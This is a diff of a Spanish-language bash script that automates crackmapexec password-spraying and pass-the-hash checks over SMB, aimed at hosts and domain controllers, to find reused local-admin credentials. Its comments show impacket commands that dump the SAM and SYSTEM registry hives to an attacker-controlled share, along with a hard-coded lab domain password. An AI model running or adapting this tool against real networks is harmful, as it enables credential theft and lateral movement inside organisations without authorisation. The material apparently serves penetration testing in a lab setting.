@@ -54,12 +54,15 @@ MIN_RAM=900;
 MAX_SCRIPT_INSTANCES=15
 if [ $USUARIO = NULL ] ; then
 echo "|              														 			"
-echo "| USO: local-admin-checker.sh -u [usuario] -h [hash] -p [password] -f [file]"
+echo "| USO: local-admin-checker.sh -u [usuario] -h [hash] -p [password] -f [file] (opcional)"
 echo "|																		 			"
 echo ""
 exit
 fi
 
+if [ $FILE = NULL ] ; then
+	FILE='servicios_archived/WindowsAlive.txt	'
+fi
 #1) smbserver.py -smb2support share .
 #2) reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.132\share'
 #   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SAM' -o '\\192.168.56.132\share'
@@ -85,85 +88,75 @@ function checkRAM (){
 }
 ######################
 
-  for ip in $(cat $FILE); do
-			echo -e "[+] $OKBLUE Testeando $ip .. $RESET"
+for ip in $(cat $FILE); do
+	echo -e "[+] $OKBLUE Testeando $ip .. $RESET"
+	if [ "$PASSWORD" != NULL ] ; then
+	#echo "PASSWORD $PASSWORD"				
+		echo "Usando password $PASSWORD"
+		crackmapexec smb $ip -u $USUARIO -p $PASSWORD --local-auth  | tee -a logs/cracking/"$ip"_smb_reusoPassword.txt & #local
+		sleep 0.3
+	else
+		echo "Usando HASH $HASH"
+		echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
+		crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth  | tee -a logs/cracking/"$ip"_smb_reusoPassword.txt & #local				
+	fi	
+done
+
+while true; do
+	crackmap_instancias=`ps aux | egrep 'crackmapexec' | wc -l`		
+	if [ "$crackmap_instancias" -gt 1 ]
+	then
+		echo -e "\t[i] Todavia hay scripts activos ($crackmap_instancias)"				
+		sleep 1
+	else
+		break		
+	fi
+done	# done true	
+
+############# parse ############
+for ip in $(cat $FILE); do
+			
+		################ user hacked ########
+		grep -qai '+' logs/cracking/"$ip"_smb_reusoPassword.txt 2>/dev/null
+		greprc=$?
+		if [[ $greprc -eq 0 ]] ; then						
+			echo -e "\t$OKRED[i] Reuso de password en ($ip) $RESET"
 			if [ "$PASSWORD" != NULL ] ; then
-			#echo "PASSWORD $PASSWORD"				
-				echo "Usando password $PASSWORD"
-				crackmapexec smb $ip -u $USUARIO -p $PASSWORD --local-auth  | tee -a logs/cracking/"$ip"_smb_passwordAdivinadoWin.txt & #local
-				sleep 0.3
-				#crackmapexec smb $ip -u $USUARIO -p $PASSWORD  | tee logs/cracking/"$ip"_smb_passwordAdivinadoWin2.txt	#dominio
+				echo -e "Usuario:$USUARIO Pasword:$PASSWORD (local)" >> .vulnerabilidades/"$ip"_smb_reusoPassword.txt
 			else
-				echo "Usando HASH $HASH"
-				echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
-				crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth  | tee -a logs/cracking/"$ip"_smb_passwordAdivinadoWin.txt & #local
-				#crackmapexec smb $ip -u $USUARIO -H $HASH  | tee logs/cracking/"$ip"_smb_passwordAdivinadoWin2.txt #dominio					
-			fi	
-	done
+				echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (local)" >> .vulnerabilidades/"$ip"_smb_reusoPassword.txt
+			fi
+			sed -i "/$ip/d" $FILE #borrar de la lista
+		fi	
+		################
+done	
 
-	while true; do
-		crackmap_instancias=`ps aux | egrep 'crackmapexec' | wc -l`		
-		if [ "$crackmap_instancias" -gt 1 ]
-		then
-			echo -e "\t[i] Todavia hay scripts activos ($crackmap_instancias)"				
-			sleep 1
+
+########### check domain controllers #####
+DOMAIN_CONTROLERS=`ls logs/enumeracion/ | grep kerbrute_users.txt | cut -d '_' -f1`
+
+for ip in $DOMAIN_CONTROLERS; do
+	echo -e "[+] $OKBLUE Testeando controlador de dominio $ip .. $RESET"
+	if [ "$PASSWORD" != NULL ] ; then			
+		echo "Usando password $PASSWORD"
+		crackmapexec smb $ip -u $USUARIO -p $PASSWORD  | tee -a logs/cracking/"$ip"_smb_reusoPassword2.txt #domain
+	else
+		echo "Usando HASH $HASH"
+		echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
+		crackmapexec smb $ip -u $USUARIO -H $HASH | tee -a logs/cracking/"$ip"_smb_reusoPassword2.txt #domain
+	fi
+
+	grep -qai '+' logs/cracking/"$ip"_smb_reusoPassword2.txt 2>/dev/null
+	greprc=$?
+	if [[ $greprc -eq 0 ]] ; then						
+		echo -e "\t$OKRED[i] Reuso de password en ($ip) $RESET"
+		if [ "$PASSWORD" != NULL ] ; then
+			echo -e "Usuario:$USUARIO Pasword:$PASSWORD (domain)" >> .vulnerabilidades/"$ip"_smb_reusoPassword.txt
 		else
-			break		
+			echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (domain)" >> .vulnerabilidades/"$ip"_smb_reusoPassword.txt
 		fi
-	done	# done true	
-
-	for ip in $(cat $FILE); do
-				
-			################ user hacked ########
-			grep -qai '+' logs/cracking/"$ip"_smb_passwordAdivinadoWin.txt 2>/dev/null
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then						
-				echo -e "\t$OKRED[i] Logeo remoto habilitado $RESET"
-				if [ "$PASSWORD" != NULL ] ; then
-					echo -e "Usuario:$USUARIO Pasword:$PASSWORD (local)" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
-				else
-					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (local)" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
-				fi
-				sed -i "/$ip/d" $FILE #borrar de la lista
-				exit		
-			fi	
-			
-			
-			grep -qai '+' logs/cracking/"$ip"_smb_passwordAdivinadoWin2.txt 2>/dev/null
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then						
-				echo -e "\t$OKRED[i] Logeo remoto habilitado $RESET"
-				if [ -z $HASH ] ; then
-					echo -e "Usuario:$USUARIO Pasword:$PASSWORD (dominio)" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
-				else
-					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (dominio)" >> .vulnerabilidades/"$ip"_smb_passwordAdivinadoWin.txt
-				fi	
-				sed -i "/$ip/d" $FILE #borrar de la lista
-				exit		
-			fi	
-			########################################
-			
-			########### user locked #####
-			grep -qai 'STATUS_ACCOUNT_LOCKED_OUT' logs/cracking/"$ip"_smb_passwordAdivinadoWin.txt 2>/dev/null
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then						
-				echo -e "\t$OKRED[i] USER LOCKET $RESET"
-				sed -i "/$ip/d" $FILE #borrar de la lista
-			exit		
-			fi	
-			
-			grep -qai 'STATUS_ACCOUNT_LOCKED_OUT' logs/cracking/"$ip"_smb_passwordAdivinadoWin2.txt 2>/dev/null
-			greprc=$?
-			if [[ $greprc -eq 0 ]] ; then						
-				echo -e "\t$OKRED[i] USER LOCKET $RESET"				
-				sed -i "/$ip/d" $FILE #borrar de la lista
-			exit		
-			fi	
-			################
-		#cat logs/cracking/"$ip"_smb_passwordAdivinadoWin.txt logs/cracking/"$ip"_smb_passwordAdivinadoWin2.txt > logs/cracking/"$ip"_smb_passwordAdivinadoWin.txt
-	done	
+		sed -i "/$ip/d" $FILE #borrar de la lista
+	fi	
+done
 
 insert_data
-
-
-
